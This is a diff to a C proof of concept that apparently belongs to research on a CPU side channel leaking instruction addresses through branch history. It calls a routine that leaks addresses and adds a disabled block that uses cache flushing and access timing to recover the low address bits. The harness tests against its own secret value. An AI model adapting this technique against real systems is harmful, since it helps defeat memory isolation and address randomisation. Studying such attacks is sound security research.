@@ -5,8 +5,7 @@
 #include <emmintrin.h>
 #include <time.h>
 
-//#define SECRET_VALUE 0x600018000
-#define SECRET_VALUE 0xffffff
+#define SECRET_VALUE 0x123456789ab
 
 extern void set_phr(int value);
 extern void shift_phr();
@@ -196,6 +195,7 @@ int main(void) {
   // set_noise_filter(init_noise_filter);
 
   uint64_t val = *(uint64_t *)secret_function;
+  uint64_t trash = 0;
   printf("Secret function first 8 bytes: 0x%lx\n", val);
   asm volatile("" ::"r"(val) : "memory");
 
@@ -210,8 +210,73 @@ int main(void) {
   fprintf(stderr, "\n\n\n");
 
   // Run the PWSC
-  struct pwsc_ans ans =
-      leak_inst_addr((uint64_t)SECRET_VALUE, init_noise_filter, 0);
+  struct pwsc_ans ans = leak_inst_addr(
+      (uint64_t)SECRET_VALUE, init_noise_filter, 0, setup_trigger, trigger);
+#if 0
+  ans.va.po_set = 0;
+  ans.va.po_co = 0;
+  fprintf(stdout,
+          "We found the higher bits to be %lx, we must now find the lower 12 "
+          "bits\n",
+          ans.va.va);
+
+  int *indexes = generate_indexes(64);
+  hit_count hits[64];
+
+  for (int i = 0; i < 64; ++i) {
+    hits[i].hits = 0;
+    hits[i].index = i;
+  }
+
+  char *va_buffer = mmap(
+      (void *)ans.va.va, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
+      MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
+
+  if (va_buffer == MAP_FAILED) {
+    fprintf(stderr, "mmap Failed\n");
+    exit(1);
+  }
+  memset(va_buffer, 0xC3, 4096);
+
+  for (int round = 0; round < 512; ++round) {
+
+    setup_trigger(SECRET_VALUE, 1, trash);
+    _mm_mfence();
+    _mm_lfence();
+
+    for (int i = 0; i < 4096; i += 64) {
+      clflush((uint64_t *)(va_buffer + i), trash);
+    }
+
+    _mm_mfence();
+    _mm_lfence();
+
+    trigger(SECRET_VALUE, 1, trash);
+
+    _mm_mfence();
+    _mm_lfence();
+
+    for (int i = 0; i < 64; ++i) {
+      int index = indexes[i];
+      size_t offset = index * 64;
+      trash = 0;
+      uint64_t *addr = (uint64_t *)(va_buffer + offset);
+      uint64_t time = time_access_inst(addr, trash);
+      trash = (trash | time) & (MSB_MASK - 1); // dependency
+      if (time < 150) {
+        hits[index].hits++;
+      }
+    }
+    _mm_mfence();
+    _mm_lfence();
+  }
+
+  qsort(hits, 64, sizeof(hit_count), sort_descending);
+  fprintf(stdout, "The index is %lu\n", hits[0].index);
+  ans.va.po_set = hits[0].index;
+  ans.va.po_co = 15;
+#endif
+  fprintf(stdout, "The answer is %lx\n", ans.va.va);
 
   // Stats
   int correct_bits = bit_accuracy_checker(ans.va.va, (uint64_t)SECRET_VALUE);
